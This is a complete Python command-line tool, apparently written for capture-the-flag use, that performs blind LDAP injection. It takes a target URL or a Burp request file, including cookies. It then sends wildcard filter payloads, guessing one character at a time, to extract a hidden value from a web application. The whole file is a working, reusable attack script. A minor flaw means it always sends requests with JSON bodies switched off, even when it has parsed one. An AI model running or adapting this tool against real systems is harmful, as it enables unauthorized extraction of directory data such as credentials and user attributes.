#!/usr/bin/python3
from typing import Any

import requests
import string
import argparse
import sys
import json
from urllib.parse import parse_qs, urlparse

alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

def parse_params(param_string: str) -> dict[str, str]:
    """Parses the query parameters into a dictionary."""
    try:
        if param_string.startswith("?"):
            param_string = param_string[1:]
        parsed = parse_qs(param_string)
        return {k: v[0] for k, v in parsed.items()}
    except Exception as e:
        print(f"Failed to parse params: {e}")
        return {}

def parse_burp_request(file_path: str) -> dict[str, str | None | bool | dict[str, str]]:
    """Parses the raw Burp Suite HTTP request file."""
    with open(file_path, "r") as f:
        content = f.read()

    lines = content.strip().splitlines()
    request_line = lines[0]
    method, path, _ = request_line.split()

    headers = {}
    body = ""
    in_body = False

    for line in lines[1:]:
        if not in_body:
            if line.strip() == "":
                in_body = True
                continue
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
        else:
            body += line

    host = headers.get("Host", "")
    scheme = "https" if headers.get("X-Forwarded-Proto") == "https" or ":443" in host else "http"
    full_url = f"{scheme}://{host}{path}"

    params = {}
    json_body = False
    content_type = headers.get("Content-Type", "")

    if method.upper() == "GET":
        parsed = urlparse(full_url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        full_url = f"{scheme}://{host}{parsed.path}"
    elif method.upper() == "POST":
        if "application/json" in content_type:
            try:
                params = json.loads(body)
                json_body = True
            except:
                pass
        else:
            params = {k: v[0] for k, v in parse_qs(body).items()}

    cookie = headers.get("Cookie")

    return {
        "method": method.lower(),
        "url": full_url,
        "headers": headers,
        "params": params,
        "cookie": cookie,
        "json_body": json_body,
    }

def validate_input(args: argparse.Namespace) -> tuple[
    str | None | bool | dict[str, str] | Any, str | None | bool | dict[str, str] | Any, str | None | bool | dict[
        str, str] | dict[str, Any], str | None | bool | dict[str, str] | Any, str | None | bool | dict[
        str, str], str | Any, str | Any]:
    """Validates and returns the parsed arguments."""
    if not args.request_file:
        if not (args.url and args.prefix and args.test_param):
            raise ValueError("URL, prefix, and test-param are required when not using a request file.")

    url = args.url
    method = args.method or "get"
    headers = {}
    base_params = {}
    test_param = args.test_param
    json_body = False
    param_prefix = None

    # Parse request file if present
    if args.request_file:
        burp_data = parse_burp_request(args.request_file)
        url = burp_data["url"]
        method = burp_data["method"]
        headers = burp_data["headers"]
        base_params = burp_data["params"]
        json_body = burp_data["json_body"]
        if burp_data["cookie"]:
            headers["Cookie"] = burp_data["cookie"]

        for k, v in base_params.items():
            if "*" in v:
                test_param = k
                base_params[k] = v.replace("*", "")
                param_prefix = base_params[k]
                break

        if not param_prefix:
            raise ValueError("Use --prefix in your input.")

        if not test_param:
            raise ValueError("No parameter with '*' found in request file. Use --test-param.")

    else:
        # Manual input
        if args.cookie:
            headers["Cookie"] = args.cookie

        if args.params:
            try:
                base_params = json.loads(args.params)
            except json.JSONDecodeError:
                base_params = parse_params(args.params)

        param_prefix = args.prefix

        if not args.test_param:
            raise ValueError("--test-param is required when not using --request-file.")

    return url, method, headers, base_params, json_body, test_param, param_prefix

def perform_request(method: str, url: str, test_params: dict[str, str], headers: dict[str, str], json_body: bool) -> requests.Response:
    """Performs an HTTP request based on the method (GET/POST)."""
    try:
        if method == "get":
            return requests.get(url, params=test_params, headers=headers)
        else:
            if json_body:
                return requests.post(url, json=test_params, headers=headers)
            else:
                return requests.post(url, data=test_params, headers=headers)
    except Exception as e:
        print(f"Error during request: {e}")
        raise

def extract_flag(url: str, method: str, headers: dict[str, str], base_params: dict[str, str], test_param: str, param_prefix: str, max_length: int, match: str, debug: bool) -> str:
    """Attempts to extract the flag through the blind LDAP search technique."""
    flag = ""
    for i in range(max_length):
        for char in alphabet:
            payload = param_prefix + flag + char + "*"
            test_params = base_params.copy()
            test_params[test_param] = payload

            if debug:
                print(f"[i] Trying: {payload}")

            response = perform_request(method, url, test_params, headers, False)

            if match in response.text:
                flag += char
                print("[+] Flag: " + flag)
                break

    return flag

def main() -> None:
    parser = argparse.ArgumentParser(description="Blind LDAP search flag extractor.")
    parser.add_argument("--url", help="Target URL (e.g., http://127.0.0.1:3000/)")
    parser.add_argument("--test-param", help="Parameter name for the query (e.g., search)")
    parser.add_argument("--prefix", help="Prefix before payload (e.g., uid=)")
    parser.add_argument("--match", required=True, help="Text to match in the response (e.g., username)")
    parser.add_argument("--length", help="Max flag length: default 32")
    parser.add_argument("--debug", action="store_true", help="Debug mode")
    parser.add_argument("--method", choices=["get", "post"], help="HTTP method")
    parser.add_argument("--cookie", help="Cookie header")
    parser.add_argument("--params", help="Base parameters (JSON or query string)")
    parser.add_argument("--request-file", help="Raw HTTP request file from Burp")

    args = parser.parse_args()

    try:
        url, method, headers, base_params, json_body, test_param, param_prefix = validate_input(args)
        max_length = int(args.length) if args.length else 32
        flag = extract_flag(url, method, headers, base_params, test_param, param_prefix, max_length, args.match, args.debug)
        print("\nDone. Final flag:", flag)
    except ValueError as e:
        print(f"value error:  {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
